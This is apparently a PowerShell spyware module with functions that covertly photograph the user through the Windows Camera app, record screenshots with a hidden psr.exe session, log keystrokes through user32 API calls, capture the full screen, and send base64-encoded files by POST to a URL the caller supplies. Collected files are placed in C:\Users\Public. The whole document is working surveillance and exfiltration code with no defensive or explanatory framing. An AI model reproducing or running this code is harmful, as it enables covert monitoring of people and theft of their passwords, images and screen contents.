function take_selfi {
    start microsoft.windows.camera:                                                                                                                                                    
    start-sleep 1                                                                                                                                                                      
    Set-Variable -Name wshell -Value (New-Object -ComObject wscript.shell);                                                                                                            
    $wshell.SendKeys('~');                                                                                                                                                             
    start-sleep 1                                                                                                                                                                      
    # Get all processes related to Windows Camera                                                                                                                                      
    Set-Variable -Name cameraProcesses -Value (Get-Process | Where-Object { $_.ProcessName -eq "WindowsCamera" })                                                                      
                                                                                                                                                                                   
    # If there are any Windows Camera processes running, kill them                                                                                                                     
    if ($cameraProcesses) {                                                                                                                                                            
        foreach ($process in $cameraProcesses) {                                                                                                                                       
            Stop-Process -Id $process.Id -Force
        }
    }

    # Define paths
    $cameraRollPath = [System.IO.Path]::Combine($env:USERPROFILE, "Pictures", "Camera Roll")
    $publicFolderPath = "C:\Users\Public"

    # Find the latest image file in the camera roll folder
    $latestImage = Get-ChildItem -Path $cameraRollPath -Filter *.jpg | Sort-Object LastWriteTime -Descending | Select-Object -First 1

    if ($latestImage) {
        # Copy the latest image to the Public folder
        $destinationPath = [System.IO.Path]::Combine($publicFolderPath, $latestImage.Name)
        Copy-Item -Path $latestImage.FullName -Destination $destinationPath -Force
        Write-Output "Picture successfully copied to $destinationPath"
    } else {
        Write-Output "No image found in the camera roll folder"
    }
}




                                                                                                                                                                              
function start_psr {                                                                                                                                                                
psr.exe /start /output C:\Users\Public\screenshots.zip /sc 1 /gui 0                                                                                                                                                                                                                                 
}                                                                                                                                                                                  
                                                                                                                                                                                   
function stop_psr {                                                                                                                                                                 
psr.exe /stop                                                                                                                                                                                                                                                              
}                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                   
function KeyLogger($Path="C:\Users\Public\keylogger.txt", $DurationInSeconds=60) {
   
    # Signatures for API Calls
    $signatures = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    # Define the Win32 type only if it doesn't already exist
    if (-not ([System.Management.Automation.PSTypeName]'API.Win32').Type) {
        Add-Type -Name 'Win32' -Namespace API -MemberDefinition $signatures
    }

    # Create output file
    $null = New-Item -Path $Path -Force -ItemType File

    try {
        $startTime = Get-Date
        $endTime = $startTime.AddSeconds($DurationInSeconds)

        while ((Get-Date) -lt $endTime) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $state = [API.Win32]::GetAsyncKeyState($ascii)

                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    $virtualKey = [API.Win32]::MapVirtualKey($ascii, 3)
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = [API.Win32]::GetKeyboardState($kbstate)

                    $mychar = New-Object -TypeName System.Text.StringBuilder
                    $success = [API.Win32]::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success) {
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally {
    }
}         

function Screenshot {
    param(
        [string]$FileName = "Screenshot.png"
    )

    # Importing necessary .NET assemblies
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Create a bitmap using the dimensions of the screen
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)

    # Create a Graphics object from the bitmap
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

    # Capture the screen and save it to the bitmap
    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)

    # Save the bitmap to a file
    $filePath = Join-Path -Path $env:Public -ChildPath $FileName
    $bitmap.Save($filePath)

    Write-Host "Screenshot saved to: $filePath"
}

function SendFile {
    param (
        [string]$FilePath,
        [string]$Url
    )

    # Read file content
    $fileContent = Get-Content -Path $FilePath -Raw

    # Encode file content to base64
    $base64EncodedContent = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))

    # Create a JSON object to send
    $body = @{
        FileContent = $base64EncodedContent
    } | ConvertTo-Json

    try {
        # Send POST request to the URL
        Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $body
    } catch {
    }
}
